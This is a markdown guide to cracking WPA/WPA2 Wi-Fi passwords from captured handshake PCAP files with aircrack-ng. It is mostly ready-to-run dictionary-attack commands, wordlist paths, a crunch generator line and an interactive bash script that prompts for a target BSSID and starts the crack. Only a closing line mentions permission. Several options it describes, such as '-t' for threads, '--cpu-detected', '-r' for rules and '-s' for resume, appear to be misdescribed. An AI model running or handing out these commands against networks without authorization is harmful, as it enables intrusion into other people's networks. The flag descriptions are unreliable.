# WiFi Handshake Cracking with Aircrack-ng

*Complete guide to extract BSSID and crack WPA/WPA2 passwords from PCAP files*

## Quick Start
```bash
# One command to see networks and crack
aircrack-ng -w rockyou.txt handshake.pcap

# Or if you know the BSSID
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF handshake.pcap
```

## Complete Workflow

### Step 1: Analyze PCAP and Extract BSSID
```bash
# View all networks in capture file
aircrack-ng handshake.pcap

# Expected output:
# ID  BSSID              ESSID         Encryption    Handshake
# 1   AA:BB:CC:DD:EE:FF  MyHomeWiFi    WPA (1 handshake)
# 2   11:22:33:44:55:66  CoffeeShop    WPA (0 handshake)
```

### Step 2: Verify Handshake Presence
```bash
# Check for valid handshakes
aircrack-ng handshake.pcap | grep -i "handshake"

# Look for WPA handshake indicator in output
# [WPA handshake] indicates successful capture
```

### Step 3: Crack the Password
```bash
# Basic dictionary attack
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF handshake.pcap

# Using common wordlists
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake.pcap
```

## Essential Commands

### Network Discovery
```bash
# List all networks in PCAP
aircrack-ng handshake.pcap

# Extract just BSSIDs
aircrack-ng handshake.pcap | grep -E "^[[:space:]]*[0-9]+" | awk '{print $2}'
```

### Cracking Methods
```bash
# Standard attack
aircrack-ng -w wordlist.txt -b <BSSID> handshake.pcap

# Multi-threaded (faster)
aircrack-ng -w wordlist.txt -b <BSSID> -t 8 handshake.pcap

# Use all CPU cores
aircrack-ng -w wordlist.txt -b <BSSID> --cpu-detected handshake.pcap

# Quiet mode (minimal output)
aircrack-ng -w wordlist.txt -b <BSSID> -q handshake.pcap
```

### Wordlist Management
```bash
# Multiple wordlists
aircrack-ng -w dict1.txt -w dict2.txt -b <BSSID> handshake.pcap

# With word mutation rules
aircrack-ng -w wordlist.txt -b <BSSID> -r rules/wpa.txt handshake.pcap

# Resume from specific point
aircrack-ng -w wordlist.txt -b <BSSID> -s 1000 handshake.pcap
```

## Practical Examples

### Example 1: Unknown Network
```bash
# Discover networks first
aircrack-ng capture.pcap

# Then crack specific BSSID
aircrack-ng -w passwords.txt -b AA:BB:CC:DD:EE:FF capture.pcap
```

### Example 2: Known BSSID
```bash
# Direct attack when you know the target
aircrack-ng -w rockyou.txt -b 11:22:33:44:55:66 handshake.pcap
```

### Example 3: Optimized Cracking
```bash
# Fast attack with multiple threads
aircrack-ng -w big_wordlist.txt -b <BSSID> -t 12 --cpu-detected handshake.pcap
```

## Complete Automation Script

```bash
#!/bin/bash
# wifi_crack_auto.sh

if [ -z "$1" ]; then
    echo "Usage: $0 <pcap_file> [wordlist]"
    echo "Default wordlist: /usr/share/wordlists/rockyou.txt"
    exit 1
fi

PCAP_FILE="$1"
WORDLIST="${2:-/usr/share/wordlists/rockyou.txt}"

echo "=== WiFi Handshake Cracker ==="
echo "PCAP: $PCAP_FILE"
echo "Wordlist: $WORDLIST"
echo ""

# Show available networks
echo "Scanning for networks..."
aircrack-ng "$PCAP_FILE" | head -15

# Get BSSID from user
echo ""
read -p "Enter target BSSID: " BSSID

# Validate BSSID format
if [[ ! $BSSID =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
    echo "Error: Invalid BSSID format"
    exit 1
fi

# Start cracking
echo ""
echo "Starting crack attack on $BSSID..."
echo "Press Ctrl+C to stop"
echo ""

aircrack-ng -w "$WORDLIST" -b "$BSSID" "$PCAP_FILE"
```

## Success Indicators

When successful, you'll see:
```
KEY FOUND! [ password123 ]

Master Key     : XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX
Transient Key  : XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX
EAPOL HMAC     : XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX
```

## Common Wordlists

```bash
# Default locations
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/nmap.lst
/usr/share/john/password.lst
/usr/share/wordlists/metasploit/password.lst

# Create custom wordlist
crunch 8 12 1234567890 -o custom.txt  # Generate numeric passwords
```

## Troubleshooting

### No Handshake Found
```
# If no handshake in PCAP:
[0 handshake] - Capture more traffic or re-capture
```

### Invalid PCAP
```
# Ensure file is valid WiFi capture
aircrack-ng invalid.pcap  # Will show error if not WiFi
```

### Performance Issues
```bash
# Use smaller wordlist first
aircrack-ng -w common_passwords.txt -b <BSSID> handshake.pcap

# Then try larger lists
aircrack-ng -w big_wordlist.txt -b <BSSID> handshake.pcap
```

## Quick Reference

| Command | Purpose |
|---------|---------|
| `aircrack-ng file.pcap` | Show networks and handshakes |
| `aircrack-ng -w list.txt -b BSSID file.pcap` | Crack specific network |
| `aircrack-ng -w list.txt -b BSSID -t 8 file.pcap` | 8 threads for speed |
| `aircrack-ng -w list.txt -b BSSID -q file.pcap` | Quiet mode |

## Pro Tips

1. **Start Small**: Try common wordlists first before large ones
2. **Use Rules**: Apply word mutation rules for better coverage
3. **Check Handshake**: Ensure `[WPA handshake]` appears in analysis
4. **Multiple Wordlists**: Combine specialized wordlists
5. **Save Results**: Use `-l key.txt` to save found keys to file

---

**Remember**: Only use on networks you own or have explicit permission to test!